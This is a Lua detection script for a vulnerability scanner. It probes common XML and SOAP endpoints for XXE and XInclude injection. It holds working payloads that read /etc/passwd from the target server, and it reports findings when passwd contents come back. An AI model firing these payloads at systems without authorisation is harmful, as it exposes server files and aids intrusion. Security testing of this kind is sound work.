-- xxe_injection.lua
-- Detects XML External Entity (XXE) Injection vulnerabilities
-- Mapped from: PortSwigger XXE labs, HTB Cyber Apocalypse, real bug bounty reports
--
-- Tests:
--   1. Classic XXE file read (file:///etc/passwd)
--   2. XXE via file upload (SVG, DOCX metadata)
--   3. Blind XXE detection (error-based)
--   4. XXE in SOAP/XML endpoints
--   5. XInclude attacks (for non-XML entry points)

local base_url = TARGET:match("^(https?://[^/]+)")
if not base_url then return end

-- /etc/passwd signatures
local file_sigs = {"root:x:0:0", "daemon:x:", "bin:x:"}

-- ── Phase 1: Find XML-accepting endpoints ──────────────────────────────────

local xml_endpoints = {
    "/api/xml", "/api/data", "/api/import", "/api/upload",
    "/api/v1/xml", "/api/parse", "/api/process",
    "/xml", "/soap", "/ws", "/wsdl", "/xmlrpc.php",
    "/api/stock", "/product/stock",
}

-- Classic XXE payloads
local xxe_file_read = [[<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root><data>&xxe;</data></root>]]

local xxe_file_read_param = [[<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>]]

-- XInclude attack (for cases where you don't control the full XML document)
local xinclude_payload = [[<foo xmlns:xi="http://www.w3.org/2001/XInclude">
<xi:include parse="text" href="file:///etc/passwd"/></foo>]]

-- Error-based blind XXE (triggers parser error with file contents)
local xxe_error_based = [[<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "file:///etc/passwd">
  <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%xxe;'>">
  %eval;
  %error;
]>
<root>test</root>]]

-- SVG-based XXE (file upload bypass)
local xxe_svg = [[<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg">
  <text font-size="16" x="0" y="16">&xxe;</text>
</svg>]]

local function check_xxe_response(resp)
    if not resp or not resp.body then return false end
    for _, sig in ipairs(file_sigs) do
        if resp.body:find(sig, 1, true) then
            return true
        end
    end
    return false
end

-- ── Phase 2: Test XML endpoints with XXE payloads ──────────────────────────

for _, endpoint in ipairs(xml_endpoints) do
    local url = base_url .. endpoint

    -- Check if endpoint exists
    local check = http.get(url)
    if not check or check.status == 404 then
        goto next_endpoint
    end

    -- Test 1: Classic XXE with generic XML
    local resp = http.post_json(url, xxe_file_read)  -- post_json sends with content-type header
    if not resp then
        -- Try with explicit XML content type by using post with xml body
        resp = http.post(url, xxe_file_read)
    end

    if resp and check_xxe_response(resp) then
        report.finding("critical", "custom", "XXE Injection: File Read (" .. endpoint .. ")",
            "XML External Entity injection confirmed — /etc/passwd contents retrieved. " ..
            "Endpoint: " .. url, url)
        return
    end

    -- Test 2: XXE with stock-check format (PortSwigger pattern)
    resp = http.post(url, xxe_file_read_param)
    if resp and check_xxe_response(resp) then
        report.finding("critical", "custom", "XXE Injection: File Read via stockCheck",
            "XXE injection in stockCheck XML endpoint — /etc/passwd extracted. " ..
            "Endpoint: " .. url, url)
        return
    end

    -- Test 3: XInclude attack
    resp = http.post(url, xinclude_payload)
    if resp and check_xxe_response(resp) then
        report.finding("critical", "custom", "XInclude Attack: File Read",
            "XInclude injection confirmed — server-side file inclusion via xi:include. " ..
            "Endpoint: " .. url, url)
        return
    end

    -- Test 4: Error-based blind XXE
    resp = http.post(url, xxe_error_based)
    if resp and resp.body then
        -- Check for file content in error messages
        if check_xxe_response(resp) then
            report.finding("critical", "custom", "Blind XXE (Error-Based): File Read",
                "Error-based XXE confirmed — file contents leaked in parser error message. " ..
                "Endpoint: " .. url, url)
            return
        end
        -- Check for XML parser error (indicates XXE might be processable)
        local body_lower = resp.body:lower()
        if body_lower:find("xml parsing error") or body_lower:find("entity") or
           body_lower:find("dtd") or body_lower:find("DOCTYPE") then
            report.finding("medium", "custom", "XML Parser Error (Potential XXE)",
                "XML parser error detected — DTD/entity processing may be enabled. " ..
                "Manual testing recommended. Endpoint: " .. url, url)
        end
    end

    ::next_endpoint::
end

-- ── Phase 3: Check if main target accepts XML ──────────────────────────────

-- Test the main target with XML content type
local main_headers = {["Content-Type"] = "application/xml"}
local resp = http.get_with_headers(TARGET, main_headers)
if resp and resp.body then
    -- Check if server processes XML differently with content-type header
    if resp.body:find("xml") or resp.headers["content-type"] and
       resp.headers["content-type"]:find("xml") then
        report.finding("info", "custom", "XML Processing Detected",
            "Server appears to process XML content. Test for XXE vulnerabilities manually.",
            TARGET)
    end
end

-- ── Phase 4: Check for SOAP/WSDL endpoints ─────────────────────────────────

local soap_paths = {"/ws?wsdl", "/service?wsdl", "/soap?wsdl", "/api?wsdl"}
for _, path in ipairs(soap_paths) do
    local url = base_url .. path
    local r = http.get(url)
    if r and r.status == 200 and r.body and
       (r.body:find("wsdl:") or r.body:find("soap:") or r.body:find("<definitions")) then
        report.finding("medium", "custom", "SOAP/WSDL Endpoint Discovered",
            "WSDL endpoint found at " .. url .. ". SOAP services are often vulnerable to XXE " ..
            "injection via XML request bodies.", url)
    end
end
